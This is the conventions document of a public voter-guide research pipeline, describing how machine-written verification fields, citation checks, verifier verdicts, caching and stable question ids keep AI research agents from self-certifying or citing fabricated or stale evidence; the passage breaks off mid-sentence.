# voter-guide-research — conventions

## This repo is public: nothing from a private project lands unreviewed

The tool was built in a private research project, and more will come over from projects like
it: a sample project file, fixtures, examples, a lesson written up during a real run. A branch
here is published the moment it is pushed, and history cannot be scrubbed afterwards, so each
of those goes through the same evaluate-and-clean step the first import did, before it is
committed:
- Review everything being copied for private specifics: names of people and organizations,
  figures and record ids from real research, research findings, copied third-party text,
  personal notes, and references to a private repo or its issues.
- For each one, remove it, reword it as a general lesson that keeps the mechanism, or replace
  it with a synthetic stand-in where the content is load-bearing (a fixture, an example). Use
  one synthetic value per identifier, so code, docs and tests still agree.
- Scan the exact tree for secrets before the first push, not only in CI: the `secret-scan`
  job runs after the push has already published the branch.
- Keep the specifics out of commit messages, PRs and issues here. Describe what was removed in
  general terms.

## The line that must not blur

**Agents own research fields. The pipeline owns verification fields.**
`Verification`, `archive_url`, and `corroboration_ok` are machine-written. An agent that
can set its own `verification.status` can mark its own fabrication verified — exactly the
failure this repo exists to prevent. Keep those fields out of the agent prompts and out of
the schema agents are shown.

Two mechanisms enforce it, and both are load-bearing:
1. `strip_machine_fields()` discards those fields when reading agent-authored claim files.
   A machine field that has to survive a strip-and-write-back lives outside the claim file
   and is re-applied: verdicts in `judgments/`, snapshots in `archives.json`.
2. `revalidate_from_cache()` re-derives every row that counts as evidence from the cached
   page, offline, on every `vg build`. A status the pipeline did not produce cannot
   reproduce, so it downgrades to `human_review` instead of rendering green.

"Reproduce" means passing the **full** offline check `vg verify` runs — source class,
snippet rules, served status, presence and uniqueness — not just finding the words.
`citation_problem()` and `check_page()` in `verify.py` are that check, and both commands call
them; a rule added anywhere else is one build will not enforce. Build's re-check once covered
only presence and uniqueness, so a forged `verified` survived on an excluded aggregator, a
blog, or a soft 404 echoing the quote.

And what renders is what that check gives, not what the file claimed: the status, reason,
excerpt and offsets are all rebuilt, and a query row is rewritten from its re-run. Accepting a
reproducible status while keeping the file's other fields let a fabricated excerpt or a forged
`verified_via_archive` ride through under a genuine match. `could_not_verify_paywall` rows are
included: they never render green, but they count toward corroboration. Rebuilding refines a
row that already matches (a normalized match now exact) and never promotes one into a match: a
`verified` that is only a normalized match now, or a paywall row whose cached page reads fine,
goes to `human_review` for `vg verify` to re-derive.

The support verdict follows the same rule. Build resets every source without a usable
recorded verdict to `unreviewed` before rendering (`judgments.merge()`), so a `support` sitting
in a claim file never renders. See "A gate is a number the tool prints" below.

If you add a command that reads `data/claims/`, decide deliberately which side of that line
it sits on. Defaulting to trust is how the invariant erodes.

## The judgment pass is not advisory

Mechanical checks prove a quote is on a page. Only the verifier pass asks whether the page
supports the *claim* — and a pipeline that records that verdict but doesn't act on it has
simply moved the fabrication one layer out, from the quote to the argument. The first
end-to-end run showed exactly that: q6 rendered `verified`, `corroboration_ok: true`,
`15/1 usable`, with all 15 sources judged unsupported by a fresh verifier.

So: a source judged `topic_only`/`contradicts`/`superseded` is not usable evidence. It does
not count toward corroboration, and a claim whose every source was rejected is
`human_review`.

Verdicts live in `data/judgments/`, one shard per question keyed by source id — **never in
the claim file**.
`vg verify` reloads claims with `strip_machine_fields()` on (that is what stops a researcher
self-certifying), so a verdict written inline is destroyed by the next verify run. Keying by
source id also means a judgment lapses on its own when a retry changes the quote, which is
correct: it was a judgment about different words.

**An unreadable verdict must fail, whether it is a whole file or a single entry. It must
never read as "unreviewed".** `load()` used to return `{}` for a file it could not parse or
that was not a list. A hand-repaired, dict-shaped shard from a live run therefore
vanished, and every source in it read as unjudged. That says "nobody judged this" when the
truth is "the verdicts are unreadable". It was also a delete, because the writer loads and
then overwrites: `record()` would have kept only the new verdict. The general rule: **when a
reader feeds a writer, reading garbage as empty is a delete.**

The same bug sat one level down. Inside a list that parsed, `load()` skipped any entry it
could not read: one that was not an object, had a typo'd, extra, or missing key, or carried
a verdict outside `VERDICTS`. It also let a second entry for the same sid overwrite the
first, and `json.loads` kept only the last of two equal keys inside one entry. Each one was
absent from the result and then deleted by the next rewrite. A field of the wrong type (a
numeric note, a string or `NaN` extractor version) loaded fine and crashed a later command,
or with `NaN` never went stale. A `null` note is allowed: it holds nothing to lose, and every
reader already takes it as empty. A sid that is not what `Source.sid` makes (empty, padded,
typo'd) loaded as a verdict that matched nothing, which reads as lapsed: a recorded verdict
silently judging nothing.

So `load()` raises `UnreadableJudgments` naming the file, and so does `load_every()` for a
directory it cannot list. Only a file that is really missing reads as empty. For bad entries
the error also names each entry's index and every problem with it, all in one message, so a
repair is not a loop of re-runs. Every command that reads verdicts stops on the error with
the file named: through `_judgments_or_exit()`, or, for `vg judge`, through its existing
`ValueError` handler around `record()`. Both escape the message, because it quotes the
file's own text and rich reads brackets as markup.

- **Read everything before acting on any of it.** `vg verify` reads every claim's verdict
  file before it fetches anything, so a malformed shard for a later claim stops the run before
  any network time is spent, not after the earlier claims' pages are fetched.
- **Write only what can be read back.** `record()` refuses an entry `load()` would refuse, so
  one bad `vg judge` call cannot stop every reader of the shard.
- **Replace a shard whole.** `_write()` writes and fsyncs a temp file, then `os.replace`s it
  into place. A reader refuses a partial file, and verifier agents write while other commands
  read, so an in-place write would let a background `vg judge` stop a concurrent `vg build`.
- **Repair, don't delete.** Rewrite a malformed file as a JSON list of verdicts, and fix a bad
  entry in place. Deleting either to get past the error discards the verdicts it holds, so
  the message says so to the agents and humans who see it.

**A verdict is per question, not per source.** It says whether a source supports *one
question's claim*, so two questions citing the same page each hold their own verdict for it,
and the two can legitimately differ: a snippet can support one claim and be `topic_only` for
another. The live runs had 13 such sources. A re-home that pooled every shard by sid kept one
verdict per source and filed it under whichever claim cited that source last. That deleted the
other verdict, and could render a `supports` green on the claim a verifier judged `topic_only`.
Nothing may pool verdicts across questions by sid; `load_every()` returns them per question.

**A sid match is not proof of ownership.** When two claims cite one source, "this claim cites
the source" is true of the wrong claim as often as the right one. A verdict records only the
source, so which claim it judged rests on the shard it sits in: asserted, never proven (#30).
That is why nothing moves a claim, or its verdicts, between shards (see "Question ids are
stable and never reused"). Every re-home had to guess ownership from a sid or trust an operator's
mapping, and both put verdicts on claims they never judged.

`record()` holds an `flock` on `judgments/` across its read and write, and readers take it
shared. Verifier agents record in parallel, so a `vg judge` landing between another's read and
its rewrite would otherwise be deleted by the rewrite. The wait is bounded (`LOCK_TIMEOUT`):
every holder needs milliseconds, and a verifier blocked forever behind a stuck process would
report nothing.

## A claim's status is settled last, in dependency order

`Claim.status` reads everything else, so anything that reads *it* runs after all of that has
settled. `check_inputs()` once ran before `revalidate_from_cache()` and
`check_corroboration()`, so it read the `corroboration_ok` the claim file carried from the
last verify and a status build was about to downgrade: q36 (`derives_from` q17) rendered
verified while q17 went to `human_review` later in the same build. It also ran in file order,
one level deep, so a claim could read an input whose own inputs had not been checked yet.
Now `check_inputs()` runs last and walks `derives_from` inputs-first, so a downgrade reaches
every claim built on it. A cycle is reported and its members marked unmet, not looped. The
order lives in one place, `cli._settle()`, which `vg build` and `vg status` both call: a new
command that reads `c.status` should call it too, rather than repeat the sequence.

**A mechanical failure outranks `pending`.** `pending` means a verdict could still clear the
claim. No verdict can clear a claim with a failed citation, and the verifier does not judge a
quote that isn't on the page, so a claim whose only source was `snippet_not_found` read
`pending` forever instead of asking for a fix. Any source in `MECHANICAL_FAILURES` now makes
the claim `human_review`, with or without verdicts, whatever its other sources say. That
includes a paywalled one: `could_not_verify_paywall` is a yellow badge outside the review
filter, and a broken citation must not hide behind it. It outranks `not_found` for the same
reason: an absence claim needs no citation, but a broken one it carries is still shown.

## Matching is literal first, normalized second — never silently

The promise to the human is that ⌘F will find the snippet, so `verify.py` tries an exact
substring match before anything else. Normalized matching (whitespace, smart quotes,
dashes, ligatures) is a real-world necessity for PDFs and copy-paste drift, but it is
always reported as `normalized_match` / `pdf_normalized_match`, never as `verified`. If you
find yourself widening normalization to make more things pass, stop: the point is to catch
bad citations, not to maximize the green count.

Gotcha found while building: `--` as an ASCII em dash does not fold via NFKC. `normalize()`
collapses hyphen runs to handle it; digit-hyphen-digit ("9-2") is unaffected.

## Uniqueness matters as much as presence

A snippet appearing three times fails. Not pedantry — an ambiguous ⌘F means the human
confirms the wrong instance. It is also why `fetch.py` prefers trafilatura body extraction
over a full DOM dump: repeated nav/footer strings create false duplicates. The full-DOM
fallback only kicks in when extraction yields under ~400 chars.

## Paywalls are flagged, never failed

A paywalled newspaper story we cannot fetch is still a good citation; the human checks it via the
archive snapshot or a subscription. Failing it would push researchers toward worse,
freely-scrapeable sources — the opposite of what we want.

`vg archive` saves a **fresh** snapshot rather than accepting whatever is already in the
Wayback Machine, and then re-checks paywalled snippets against it (`verified_via_archive`).
Both matter for the same reason: on a paywalled row the snapshot is the human's only route
to the text, so a stale capture that predates the quote is worse than no snapshot at all —
it looks like verification.

## Nothing to search is not "not on the page"

A scanned PDF serves fine and extracts to nothing but the `[[page N]]` markers
`_extract_pdf()` inserts. That text is truthy, so every `not page.text` check let it through
to the search, which found nothing: `snippet_not_found`, "the quote was reconstructed rather
than copied", and from `vg check`, "Do not cite this". A real citation to a real filing,
called fabricated — the verdict that pushes a researcher to substitute a copy they can read.

`fetch.has_text()` is the one test for "is there anything to search". Wherever page text is
read, use it, never `not page.text` — or `fetch.unreadable_reason()` where an error or a
non-2xx page must count as unreadable too, since a bot challenge has text. Two changes each
re-derived it as `page.text.strip()` within a day of it being made shareable, which is how
this gap reopens. `vg check` calls the verifier's own `snippet_problem()` and
`check_snippet()` rather than re-implementing them, so a researcher's self-check judges a
snippet and a page exactly as `vg verify` does (source class aside: that needs the whole
citation).

A PDF that served with no text is `human_review`, with a reason saying what to do (confirm
by eye and keep it with a `page` locator, or cite a text-layer copy with
`secondary_host_ack`). Not `fetch_failed` either: the fetch worked, and that label invites
the same swap.

It is decided in `check_page()` at read time, not recorded as a fetch error. A fetch-time
error reaches only pages fetched after it exists; a read-time check covers every page already
cached, with no extractor bump.

`has_text()` is whole-document, so a typed cover page in front of scanned schedules makes the
PDF searchable, and a quote on a scanned page came back `snippet_not_found`.
`fetch.pages_without_text()` is the same test applied between markers — never a second
definition of "no text". A miss whose `page` names one of them is the scan case, on that page.
A miss with no such `page` stands, since a blank page is common and downgrading every miss on
one would weaken the fabricated-quote check; its reason names the text-less pages instead.
That makes `page` part of the check, so `vg check` takes `--page`. A text-less page may be
blank rather than scanned, and the extraction can't tell, so `page` pointed at a blank page
also reaches `human_review`: still a failure, never green, and its reason tells the human a
blank page means the quote is not there. Telling the two apart is #28.

The snapshot check is the exception to "the miss stands", and the reason is worth keeping: a
rule is only as right as the statuses it chooses between. In `check_page()` the alternative to
`snippet_not_found` is a softer verdict, so letting a miss stand protects the fabricated-quote
check. In `check_snapshot()` the alternatives are `archive_unusable`, which drops the link — on
a paywalled row, the human's only route to the text — and `archive_unconfirmed`, which vouches
for nothing. So a miss on a capture with text-less pages is unconfirmed, naming them. Copying
the first rule into the second path is what made it wrong there.

Still open: `vg check-claim` fails a kept scan however it is cited, so the researcher agent is
told to hand that one failure on (#29).

## Text the pipeline inserted is never evidence

The `[[page N]]` markers are ours. `[[page 7]]` is ten characters, has no line break, and is
unique in any PDF of seven or more pages, so it verified against documents that never contain
it. A snippet containing one is refused in `snippet_problem()`, and `_locate()` drops any
hit touching one, which catches a fragment ("page 7]]") and keeps markers out of uniqueness
counts. Anything else the extractor adds to page text needs the same treatment: the promise is
what a human's Cmd-F finds in the document, not what our extraction contains.

## Report the first failure, not the last

`_extract_pdf()` returned its failure in the title slot, and the row read `fetch_failed: empty
pdf text`. Both cached rows it hit were HTML 404 pages at `.pdf` URLs: the 404 caused the
extraction failure, and recording the extraction failure hid the 404. An extraction failure is
now recorded only on a response that served, naming its cause and content type. An unopenable
200 PDF stays `fetch_failed`, not `human_review` like a scan: a scan opened and has pages, but
an unopenable file is not known to be a document at all, and the common case is an error page.
(An HTML page at a `.pdf` URL is still parsed as a PDF, so a paywall there is failed: #27.)

## Rich reads brackets as markup

`con.print()` and `Table.add_row()` treat `[...]` as a style tag. Page text printed raw showed
`[[page 1]]` as `[]` and dropped `[sic]`, so `vg fetch` hid the page breaks a researcher cites
by, a snippet copied from its output was not on the page, and `vg check-claim` reported a
refused marker as "snippet contains [], a page locator". Anything from a page, a claim, or an
exception goes through `escape()` before it reaches the console, and text a researcher may
copy (page text, a query value) is printed as `Text` with `soft_wrap=True`, which also stops
`:ok:` becoming an emoji and an 80-column wrap putting line breaks in a snippet. `vg fetch`,
`vg check`, `vg check-claim`, and the `vg verify` / `vg judgments` tables do; other prints in
`cli.py` (the `[red]{e}[/]` error lines, `vg archive`'s snapshot notes, the query no-match
note) still don't.

## A verdict is about a source as cached at judgment time

Three staleness bugs in one night, all the same shape and caught by three different amounts of
noise: a stale `expected` value was caught **loudly** by `vg check-claim`; a stale cached page
is now caught **automatically** by `EXTRACTOR_VERSION`; a stale *judgment* was caught by
**nothing**. Six verdicts said "roster-only, no bill number" about pages that, after a
re-fetch, contain the bill number.

Verdicts now carry the fetch time and extractor version of the page they judged, and one that
predates its page is reported and NOT applied — the source reverts to unreviewed, which the
pipeline already treats as not-verified, so it fails toward re-checking rather than toward
shipping.

Direction matters less than silence. That instance made the pipeline harsher than the evidence
warranted, costing good citations. The reverse — a `supports` surviving a re-fetch that removed
the supporting text — ships a green row nobody checked, by the same mechanism.

**The stamp and the check must read the same cache.** They didn't. `vg judge` stamped from the
shared cache (`_cache_root()`, so `data/cache`), while `apply_to()` looked the page up under
the data dir it was handed. For a candidate run that is `data/<candidate>/cache`, where the page
normally isn't, and a missing page reads as "not stale": the check compared nothing and passed
the verdict. Both sides now go through one lookup (`judgments.judged_copy()` / `is_stale()`).
`cache_root` is a required keyword on `verdicts_for()` and `apply_to()`, because defaulting it
to the data dir *is* the bug. Every caller passes `_cache_root(data, cache)`, and every command
that resolves a cache root takes `--cache` (`vg query` and the `vg calaccess` subcommands
included). If you override `--cache` for build, override it for judge too.

The miss did not stay a miss. `load_cached()` went through `cache_dir()`, which mkdirs, so the
first check of a recorded verdict created `data/<candidate>/cache/pages`, and `_cache_root()`
then preferred that directory to the shared one. From there every command for the candidate ran
on a forked, near-empty cache: stamp and check agreed again, but about the wrong copy, and
`vg build` downgraded sources for want of a cached page. A read now creates nothing. A lookup
that creates the thing it looks for can change where the next lookup goes.

**No page to compare against means stale, not fresh.** Even with one root, `is_stale()` returned
"" whenever the lookup came back empty (a deleted page, an unparseable cache file, a mistyped
`--cache`), and `vg judge` wrote an empty stamp for an uncached page, which truthiness guards
then exempted from every check forever. Every path that cannot make the comparison now answers
stale; fresh has to be shown. The same rule, three places:
- `vg judge` refuses an uncached page (run `vg verify` first) and writes nothing. It also
  refuses unless the named claim, by exact case-sensitive id, cites the sid: `q07` for `q7`, a
  sid another claim cites, or `Q1` on a case-insensitive disk (which `vg build` reads as
  `q1.json` and `vg judgments` misses) each wrote a verdict nothing read, and said "recorded".
  `vg judgments` names any shard filed under an id no claim has, and opens a shard by name as
  `vg build` does, so the two agree about `Q1.json` on either kind of disk. Where the disk
  opens `Q1.json` as `q1.json`, it *is* q1's shard, which the disk decides and a source id does
  not (`judgments.opened_as()`). On a case-sensitive disk it is simply a shard no claim has:
  nothing reads it. Either way the fix is to rename it to the claim's exact id by hand.
- `--cache` names the directory that *holds* `cache/`: `--cache data`, not `--cache
  data/cache`. Every command refuses a `--cache` that is itself a cache directory (it holds
  `pages/` or `calaccess/`), since `fetch` and `verify` used to create a second cache inside
  it. `judge`, `judgments`, `build` and `status` never create a cache, so they also refuse an
  explicit root holding no `cache/` at all, and warn when the inferred one has none.
- Stamps compare as parsed times, never text, and a cache holding an *older* copy than the
  one judged (a merged stray, a restored backup) is stale too.

Two deliberate exceptions. A **legacy** verdict, recorded before stamping (every one in the
committed run), is checked against its `judged_at`: a page fetched no later is the copy that
was cached when it was judged. Blanket-stale would re-judge whole runs to learn nothing;
blanket-fresh was the fail-open. A **query citation** has no page at all, and its result is
re-run at every build; a changed query *definition* is query versioning's (below).

**Stamp the copy the verifier read, not whatever is cached when `vg judge` runs.** Two bugs of
one shape. The cache is shared, so another run can re-fetch a page between `vg verify` and
`vg judge`: the verdict was stamped from the new copy, read fresh against it, and after the
next verify rendered `verified, supports` on text no verifier saw. And an archive-verified
context comes from the Wayback snapshot, but the stamp and the check both looked up the cited
URL — the paywall stub, which never changes — so a verdict about snapshot A rode through every
re-archive onto snapshot B. One mechanism covers both:
- `vg verify` records the copy it built each context from (`Verification.context_page`: URL,
  fetch time, extractor version), which is the snapshot for a `verified_via_archive` row.
- `vg judge` stamps that copy (`Judgment.page_url` beside the time and version) and refuses
  when the cache no longer holds it, or when it is not where the context comes from now. The
  copy comes from a claim file loaded trusted, which is safe only because it can refuse and
  never grant: the stamp is read off the cached page, and the check below compares its URL.
- `is_stale()` compares a verdict with the page it names, and reads it stale when the context
  now comes from another page (`Source.context_url`, also the page revalidation rebuilds the
  context from: one rule, not two copies that can drift). That is decided from the run's
  archive records, never from the claim file's `context_page`, so the records go on before any
  verdict is checked. For build and status that is `cli._settle()`, which now owns the whole
  order (snapshots, then verdicts, then revalidation, corroboration and inputs). `vg judgments`
  and `vg judge` apply them to archive rows themselves. One that forgets reads archive
  verdicts stale, not fresh. `vg judgments` never applied them at all, and counted every
  archive row as blocked whatever had been judged. `vg verify`'s own early `apply_to()` runs on
  stripped claims before anything is fetched, so it reads archive verdicts stale too; nothing
  it decides depends on that, and its write-back never carries a verdict.
- **Every `vg archive` makes archive-row verdicts stale**, by design: it saves a fresh
  snapshot, and a fresh snapshot is a different copy. It runs after the judgment pass, so it
  says how many verdicts it left stale, and the skill says to run `vg judgments` again after
  it. Without that, every paywalled row reaches the review app unreviewed.

One-time costs of the change, each failing toward re-checking. A claim verified before
`context_page` existed has to go through `vg verify` again before `vg judge` accepts a verdict
on it. A verdict on an archive row recorded before `page_url` existed was stamped from the stub,
so it reads stale and needs judging again, and so does any verdict stamped from the cited page
on a row now at `could_not_verify_paywall`: nothing shows whether it was about a snapshot the
row has lost. It is not re-judgeable as it stands, so its reason says the row needs a context
back from `vg archive` or `vg verify` first. `page_url` is written only when it names a snapshot
(`_WRITTEN_WHEN_SET`, as for the query-citation fields), so a shard of cited-page verdicts
reads, and checks correctly, in a checkout from before this change. One snapshot verdict makes that
checkout refuse its whole shard, and so every command that loads it — rather than check the
verdict against the stub.

`vg judgments` asks the same question `vg judge` does before counting a source as waiting
(`judgments.unjudgeable_page()`, the page counterpart of `unjudgeable_query()`): a source
verified before `context_page` existed, or whose copy was re-fetched since, is blocked on `vg
verify`, not waiting on a verifier. Counted as waiting, the gate could never reach 0 by judging.
It asks with the claim file's `context_page` as loaded, before revalidation rebuilds it from
the page cached now, since that file is what `vg judge` reads.

## Cache is authoritative — so version the extractor

A fetch-layer fix does not reach pages already cached, and nothing else signals that a cached
page predates it. Roll-call pages cached before the full-DOM fallback held only a name roster,
so citations to them could not identify their own bill and were rejected as `topic_only` —
which reads as a research failure rather than a stale cache, and cost a research session real
effort chasing it.

`EXTRACTOR_VERSION` fixes the class: bump it whenever extraction changes what a page yields,
and `fetch()` re-fetches anything cached under an older version automatically.

**A failed re-fetch never replaces a good page.** A bump re-fetches everything, including
hosts that now block us (cal-access, paywalled outlets); writing their exception, 403 or 500
over the cached page would send every citation of it to `fetch_failed` — a fix destroying
the pages it meant to improve. The good copy is kept and served as-is under its older
version; the failure is recorded on the page (`refetch_failure`), so it is retried only on
`--refresh` or the next bump, not on every run. It is reported where each reader looks: a
warning per run naming the URL and the failure; `vg fetch` and `vg check`; and, first in
the reason, every row `vg verify` checks against that page, plus every usable row `vg build`
re-derives — the review app and the retry loop never see a log. "Failed" means an
exception, a non-2xx/3xx or no text, never the paywall heuristic: that flags any short titled
page, and extractor fixes shorten pages. Verdicts are checked against the page's own
extractor version for the same reason: the kept text is the text they judged.

## Cache is authoritative

The verifier and the review app read the same cached page text. Never re-fetch at render
time: recorded match offsets would drift out from under the highlight, and "verified" would
stop meaning anything.

## localStorage and file://

The review app must be served (`vg serve`), not opened as a file. Several browsers disable
`localStorage` on `file://` origins and the checkbox state vanishes with no error.

## Race-specific content lives in races/

Nothing about a candidate, an office, or a state belongs in `src/`, the skill, or the agent
definitions. A race is one file in `races/` naming its source lists; the source lists are
`sources/<region>-sources.yaml` and merge. If you find yourself adding a candidate name to
the pipeline, put it in the race file instead.

## Researchers search; they are never told what they will find

Two rules, same reason:

**Questions ask what the record shows.** "What documented allegations of misconduct exist?"
is research; "confirm the Doe settlement" is transcription. A researcher handed the
answer finds that answer and stops — so a second incident, a bigger donor, a more recent
filing never surfaces, and the corroboration you get back is the pipeline agreeing with
itself.

**Race context is thin on purpose.** `race.context` goes verbatim into every researcher
prompt, and it is unverified by construction — no snippet, no source, `vg verify` never
looks at it. So a factual claim placed there is believed by every researcher and checked by
none. Context earns its place by helping *find records* (which bodies keep minutes on this
office, which LegInfo host covers which years); anything else is a question with a citation.
Known claims live under `# Completeness check`, which `races.load()` splits out of
`context` — check it *after* results are in, and treat a gap as a finding rather than
topping up a claim with the answer.

## One run per candidate; one cache for all of them

Each candidate is a separate run under `data/<candidate-id>/` — own claims, own retries,
own review progress. `vg new-candidate <id>` scaffolds it and retargets the question set to
that person's name, so a researcher is never left inferring who "the candidate" means.

The page cache is deliberately **not** per-candidate. The same filing, article, or roll call
routinely covers more than one of them, and re-fetching per run would both waste time and
risk handing two runs different bytes for the same URL.

Two things that must stay per-candidate: the review app's storage key (it is derived from
the title, which is why `vg build --candidate <id>` names the person — two candidates
sharing a key would show each other's checkmarks), and the race file's completeness check.

One consequence of separate runs worth keeping in mind: `conflicts.py` compares dollar
figures across every claim it is given. That is right within a candidate and wrong across
two, so if these datasets are ever merged, scope the cross-claim comparison by subject
first.

**Gotcha: a rule keyed on "does a cache exist here?" fulfils itself.** `_cache_root()` used
to let a run's own `cache/` win if present. The first stray write into `data/<candidate>/cache`
created exactly that condition, so the stray *became* the cache: one fetch with
`--data data/<candidate>` forked the pages and hid the CAL-ACCESS database, and every query
citation in the run failed at once. A candidate dir now uses its parent's cache whenever the parent is a
data root (it has the race's `questions.json` template, written before any candidate exists),
stray or not, and names the stray in a yellow warning; `--cache` still overrides. The parent's
own `cache/` is deliberately NOT part of the test: it is gitignored, so on a fresh clone it
does not exist yet and the first run would fork. Don't let the existence of an output
directory decide where outputs go: whatever first creates it gets to pick. Every command that
touches the cache — `vg calaccess` included — must resolve its root through `_cache_root()`
and take `--cache`, or two commands disagree about where the database lives. That includes reads: the verdict
staleness check used to look under the candidate dir and, through `cache_dir()`'s mkdir,
recreate the stray on every run (see "A verdict is about a source as cached at judgment time").

## Question ids are stable and never reused

A question id names one question for the life of a run. **A split or reworded question gets a
new id, and the old id is retired**: never given to another question. Retiring it is done by
hand, in three parts:
- move its claim file out of `claims/`, to `claims-archive/`;
- move its verdict shard out of `judgments/`;
- point any `derives_from` that names the old id at the new one.

Nothing in the pipeline moves a claim between ids. A dependent still naming a retired id goes to
`human_review` with the input missing.

**`vg build` and `vg status` are the rule's gate** (`questions.check()`, run by
`cli._question_ids_fail()`). Each compares every claim with the question the run's
`questions.json` holds for its id, and exits 1 on either break:
- a claim on an id the set does not list: a retired id whose claim was left in `claims/`, which
  would otherwise render beside its replacement;
- a claim whose `question` differs from the text at its id, whitespace and Unicode composition
  aside: a reworded or reused id, or a claim that misquotes its question. On disk the two look
  alike, so both fail, and the message gives the fix for each.

Build renders nothing until both are fixed. Before the gate, `vg build` never read
`questions.json`, and every command exited 0 on both. A `maps_from` still declared in the set is
reported without failing: nothing applies it now, so no claim moves, and each is checked against
the question at the id it sits on. Settle it and delete the key. An identity pair moved nothing,
so it is not reported.

`vg check-claim` runs the same comparison on the one claim a researcher is handing on, so a
misquoted question fails there rather than stopping the whole run's review app at build. It
checks against the set of the run the claim sits in, the directory holding its `claims/`, not
`--data`: a researcher on a candidate run checks with the default `--data data`, whose set is
the root template, not the copy retargeted to the candidate.

Which `questions.json` is the run's is #8. Until a run declares it, the gate reads the run's own
(`data/<candidate>/questions.json`, which `vg new-candidate` writes), else the data root's. A set
that can't be read as one question per id fails and names every problem: not a list, an entry
with no id or text, or one id given twice. Ids differing only in case are one id, since they are
one claim file and one shard on macOS's default disk. Read as empty, the set would report every
claim as retired. Read as missing, it would check nothing, and so would falling back to the
root's when the run's own can't be read (a dangling symlink included). With no set at all, the
gate says so and checks nothing.

What the gate can't see is a reused id once the new question's research has replaced the old
claim. The claim then matches the set, and the shard's old verdicts apply to it wherever it cites
the same source. They render green on a claim no verifier judged, because a verdict names only
its source (#30). The gate catches the reuse only while the old claim is still in `claims/`, so
move a reworded or replaced question to a new id before anyone researches it.

This rule replaced `vg remap`, which re-filed claims onto a renumbered question set (declared
as `maps_from` in `questions.json`) and re-homed their verdicts, and `vg judgments --repair`,
which re-homed verdicts after the fact. Both are retired: invoking either exits 1 and states
this rule. Question ids are also file names, and a verdict belongs to a claim only through the
shard it sits in, so every move was a chance to attach a real verdict to the wrong claim. remap
was the largest single source of defects in the codebase, and each one was a false green or
lost data: re-application, path traversal through a mapping entry, ids differing only in case,
a crash mid-move, sources shared across questions, stranded claims, dangling `derives_from`,
and a dropped `previous_question`. It was written for one migration, which had finished.
Hardening it further cost more than it could ever save, and stable ids remove the need.

What is left:
- `maps_from` and `mapped_from` in a `questions.json`, and `previous_question` in a claim file,
  still load; nothing writes them, and the gate reports a `maps_from` (above). `vg new-candidate`
  copies neither of the first two: they are another run's history, and a new run has no earlier
  id space. `Claim` has no
  `previous_question` field, so it is ignored on load and the next `vg verify` write-back drops
  it, as it always has (#85, closed with remap, since nothing writes it now).
- A `judgments-backup/` that an interrupted re-home left behind still stops every command that
  reads verdicts, `vg remap` included, because the shards may be half-rewritten. The message
  says how to undo it: run `vg judgments --rollback` from a checkout of
  `judgments.LAST_WITH_ROLLBACK`, with the run's absolute path, since a relative `--data` there
  names that checkout's own data/. The rollback leaves the migration pending, so then re-run the
  interrupted command from that same checkout to finish it.
  `judgments-backup.partial/` and `judgments-backup.discard/` are different: one was still being
  built and had touched no shard, and the other was already retired after its re-home finished.
  Nothing reads them, and nothing clears them now, so `vg judgments` names them
  (`judgments.leftovers()`). Delete them; never restore from them.
- A run's `.remap-applied` marker is read by nothing now. The old instructions said to commit it
  beside the run's claims, so a tracked one can outlive the command, and `.gitignore` covers only
  the data root's: delete it in the run's next commit.
- Question-id validation was never remap's and stays: the id pattern (`models.QID_PATTERN`,
  checked again in `judgments.path_for()`), and `vg judgments` counting a shard the disk opens
  under a claim's id as that claim's (`judgments.opened_as()`).

Lessons from it that still apply:
- **Don't keep hardening a tool for a finished one-off job. Remove the need for it.**
- **A description of a change must not outlive the change.** `maps_from` said where claims lived
  *before* a migration, and it read exactly the same after the migration ran, so a second apply
  moved every claim again. Anything that describes a change rather than a state has to be retired
  when the change is applied.
- **When old and new ids overlap, files on disk can disprove that a move happened, never prove
  it.** A finished permutation and an unstarted one look alike.
- **If anything rewrites several files as one change again**, keep a backup that is complete or
  absent at every instant. Build it beside its final name, fsync it, and rename it into place.
  Retire it by renaming it to a name nothing reads, then delete it. `rmtree` is not atomic, and
  a half-deleted backup read as the truth drops everything it lacks. Make recovery a command,
  not a procedure: the hand-written one told operators to remove the shards the backup lacked.
- **On a case-insensitive disk, remove before you write.** On macOS's default volume, `q1.json`
  *is* `Q1.json`, and `os.replace(tmp, "q1.json")` over it keeps the name `Q1.json`. Writing the
  new name and then unlinking the old one deleted what had just been written. For the same
  reason, names inside one directory must differ in more than case. CI's disk is case-sensitive,
  so the case-insensitive path never runs there: pin it with a test that patches the disk's
  answer (`judgments._same_file()`), as
  `test_vg_judgments_counts_a_shard_a_case_folding_disk_opens_as_the_claims` does. When a change
  touches names, run the suite on both kinds of disk: a Mac's default volume, and
  `pytest --basetemp=<dir>` on a case-sensitive one. A case-sensitive APFS disk image
  (`hdiutil create -fs "Case-sensitive APFS"`) gives a Mac one.

## A real citation to the wrong document passes every check

Form 700s and campaign finance forms are **series**. A 2024 filing verifies exactly as well
as the 2025 one sitting next to it in the same search results: same host, same institutional
author, snippet genuinely present, unique, ⌘F-able. Verification asks whether a snippet is
on a page. It cannot ask whether that page is the current filing, and no amount of
tightening the matcher will change that — the mechanical layer is the wrong place for the
question.

Observed in testing, and instructive: the retry didn't help either, because the retry loop
was feeding back only mechanical failures. The researcher heard "snippet not found", fixed
the *quote*, and kept the stale document.

So the question is split three ways:
- `researcher.md` — open the filer's index, take the newest, put the period in the answer.
- `missing_filing_date()` — the one mechanical grip available: a citation on a filing host
  must carry its own date, or nobody downstream can even ask the recency question.
- `verifier.md` — `superseded` is a verdict. Checking the index for a newer filing is
  judgment, which is what that agent is for.

The general shape: when a defect is invisible to the mechanical layer, don't stretch the
mechanical layer. Give it to the judgment layer and make the precondition checkable.

## Unreachable source → silent substitution. Make the substitution loud.

The general failure: a researcher cannot reach the authoritative record, quietly cites
something else, and every downstream check passes because the substitute is a real document
with the quote really in it. Observed here with an annual financial-disclosure filing: the
issuing agency's portal is a JS app, so a researcher cited a copy hosted by another public
agency — right document, wrong year, perfect verification.

`secondary_host()` catches the class, not the instance: a `primary_document` or
`official_record` cited from a host that is not the issuing authority. Citing a copy is
allowed — often it is the only reachable version — but it must carry `secondary_host_ack`
saying what could not be reached and why this copy is the same document. `vg check-claim`
fails without it, and the review app badges the row "copy, not the issuing authority".
The rule is not "never cite a copy", it is **never substitute silently**.

The other half is fixing the reachability where possible, rather than only detecting the
symptom — and then *recording* it, so the finding outlives the session that made it.

`sources/access/<host>.yaml` is that record: what a naive fetch gets, any endpoint that
works, and the known limits. `vg source-access [host]` reads it, `--run-recipe` executes one,
and `vg source-import-curl` turns a browser "copy as cURL" into an entry. Negative results
